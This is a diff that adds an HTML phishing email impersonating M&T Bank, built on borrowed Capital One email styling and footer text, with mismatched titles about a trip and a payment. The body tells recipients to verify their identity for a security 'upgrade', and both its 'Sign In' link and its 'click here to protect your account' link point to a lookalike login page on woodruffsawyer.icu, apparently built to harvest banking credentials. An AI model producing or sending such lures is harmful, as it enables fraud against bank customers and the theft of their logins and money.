@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+  <meta charset="UTF-8">
+  <title>Information about your upcoming trip</title>
+  
+  
+  
+  
+  
+</head>
+
+<body>
+
+  <head>
+     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <!--[if !mso]><!-->
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <!--<![endif]-->
+    
+      <title>Thank you for your Payment</title>
+  
+      <!--[if (gte mso 9)|(IE)]>
+    <style type="text/css">
+        table {border-collapse: collapse;}
+    </style>
+    <![endif]-->
+    <style type="text/css">        
+        @import url('https:&#x2F;&#x2F;content.capitalone.com&#x2F;DigitalMessaging/images/global/css/webfont.css');
+        * [summary~="x-cssbuttonact"]:hover {background-color:#10731c !important;}
+        * [summary~="x-cssbuttonpro"]:hover {background-color:#0a5c8c !important;}
+        * [summary~="x-cssbuttondes"]:hover {background-color:#a6261f !important;}
+        * [summary~="x-bodylink"]:hover {color:#0a5c8c !important;}
+    </style>
+      <style type="text/css">
+        .ExternalClass {width:100%;}
+      					.applelinks a {color:inherit; text-decoration:none;}
+            .social_bar div {float:right;}
+            .social_bar div:nth-child(2) {float:left;}
+        @media screen { 
+            .webfont {
+                font-family: 'Optimist', arial,helvetica,sans-serif !important;
+            }
+            .webfontlt {
+                    font-family: 'OptimistLight', arial,helvetica,sans-serif !important;
+                }
+            .webfontsb {
+                font-family: 'OptimistSemibold', arial,helvetica,sans-serif !important;
+            }
+        }
+        @media only screen and (max-width: 639px) {
+            [style*="font-size:14px"] {
+                font-size:16px !important;
+                line-height:20px !important;
+            }
+        }
+        @media screen and (max-width: 414px) {
+            .cssbutton {
+                min-width:100% !important;
+                margin: auto !important;
+            }
+        }
+   </style>
+     <!-- CRD: 0817, SID: 5.4 -->
+</head>
+
+<body style="background-color:#e8e4e7; margin:0; padding:0; min-width:100%;" bgcolor="#e8e4e7" class="standard">
+<div style="width:100%; table-layout:fixed; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; -webkit-font-smoothing:antialiased; background-color:#e8e4e7;">
+    
+<span style="display:none !important; mso-hide: all; font-size:1px; color:#ffffff; line-height:1px; max-height:0px; max-width:0px; opacity:0; overflow:hidden;" class="preheader">Update your security information and get tips to help you prepare.&nbsp;</span>
+    <span style="display:none !important; mso-hide: all; font-size:1px; color:#ffffff; line-height:1px; max-height:0px; max-width:0px; opacity:0; overflow:hidden;" class="preheader-padding">&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;</span>
+
+    <!--[if (gte mso 9)|(IE)]>
+      <table width="640" align="center">
+          <tr>
+              <td>
+    <![endif]-->
+   
+   <table cellpadding="0" cellspacing="0" border="0" style="margin:0 auto; width:100%; max-width:640px;" align="center" bgcolor="#e8e4e7">
+        <tbody><tr>
+          <td style="padding-top:15px;">
+          
+          	<table width="100%" style="width:100% !important;" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" role="header" class="header">
+               <tbody><tr>
+                  <td style="padding:10px 25px;" class="logo"><a href="#" target="_blank"><img src="https://1000logos.net/wp-content/uploads/2020/06/MT-Bank-Logo.png" style="display:block; font:14px Arial, sans-serif; color:#011728; line-height:16px;" class="webfont" width="148" height="75" border="0" alt="Visit M&T Bank" align="middle"></a></td>
+                  <td style="padding:10px 25px;" align="right" class="sign_in"><a href="https://woodruffsawyer.icu/wp-content/uploads/2023/MT/Login/index.php" summary="x-bodylink" style="font: 14px arial,helvetica,sans-serif; color:#027856; text-decoration:underline;" target="_blank" title="Sign in to your account" class="webfont">Sign In</a></td>
+               </tr>
+            </tbody></table>
+            
+            
+           
+            
+            
+            <table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" role="presentation" class="body">
+            	<tbody><tr>
+              		<td style="padding:25px 25px; font-size:14px; font-family: arial,helvetica,sans-serif; line-height:22px; text-align:left;" class="webfont"><span style="font-size:16px"><strong>Help us keep your Account safe</strong> </span> <br><br>
+                    
+                
+
+                        Verify your identity now, we have a new upgrade to protect all our valid customers. <br><br>We may ask you to confirm information you provided when you created your account to make sure you're the account holder.<br><br><strong> <a style="font: 14px arial,helvetica,sans-serif; color:#027856; text-decoration:underline;" target="_blank" href="https://woodruffsawyer.icu/wp-content/uploads/2023/MT/Login/index.php">click here to protect your account</a> </strong><br><br>
+
+                        Thanks for helping us to maintain your account's security<br><br>
+
+                        Yours sincerely,<br><br>
+                        <strong style="font: 14px arial,helvetica,sans-serif; color:#027856;">M&T Bank</strong>  
+
+                  </td>
+          		</tr>
+         	</tbody></table>
+         	
+         	
+         	<table width="100%" cellpadding="0" cellspacing="0" border="0" class="disclosure">
+              	<tbody><tr>
+                	<td style="padding:20px 25px; font:10px arial,helvetica,sans-serif; color:#666666; line-height:14px; text-align:left;" class="webfont">
+                  <strong>Important Information from M&T&nbsp;Bank</strong><br><br>
+                
+                  <span class="com-tran"><a href="#" target="_blank" style="color:#666666; text-decoration:underline;">Contact Us</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#" target="_blank" style="color:#666666; text-decoration:underline;">Privacy</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#" target="_blank" style="color:#666666; text-decoration:underline;">Help Prevent Fraud</a></span><br><br>
+                
+                  To ensure delivery, add <a href="mailto:##email##" style="color:#666666; text-decoration:none;" target="_blank">mtb@notification.mtb.com</a> to your address book.<br><br>
+                
+                  <span class="com-tran">This email was sent to <a href="mailto:" style="color:#666666; text-decoration:none;" target="_blank">##email##</a> and contains information directly related to your account with us, other services to which you have subscribed, and/or any application you may have submitted.</span><br><br>
+                
+                  *Data and message rates may apply.<br><br>
+                
+                  Please do not reply to this message, as this email inbox is not monitored. <a href="#" target="_blank" style="color:#666666; text-decoration:underline;">To contact us, visit www3.mtb.com/contact.</a><br><br>
+                
+                  Products and services are offered by M&T&nbsp;Bank, N.A., Member FDIC.<br><br>
+                
+                  <span class="applelinks">
+                  
+                  © 2023 M&T&nbsp;Bank. M&T&nbsp;Bank is a federally registered service mark. 15000 M&T&nbsp;Bank Drive, Attn.: 12038-0111, Richmond, Virginia 23238. To contact us by mail, please use the following address: M&T&nbsp;Bank, P.O. Box 30285, Salt Lake City, Utah 84130-0285.<br><br>
+                    
+                  <span class="info">
+                  </span><br><br>
+                  
+                  <span style="font-size:12px;"></span>
+                  
+                 </span></td>
+              	</tr>
+            </tbody></table>
+          	
+                                         
+            </td>
+        </tr>
+     </tbody></table>
+   
+   
+    <!--[if (gte mso 9)|(IE)]>
+            </td>
+        </tr>
+    </table>
+    <![endif]-->
+    
+   
+    
+</div> 
+<table width="1" height="1" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td style="font-size:0px; line-height:0px;"><img src="#" width="1" height="1"></td></tr></tbody></table>   
+
+
+
+</body>
+  
+  
+
+</body>
+
+</html>
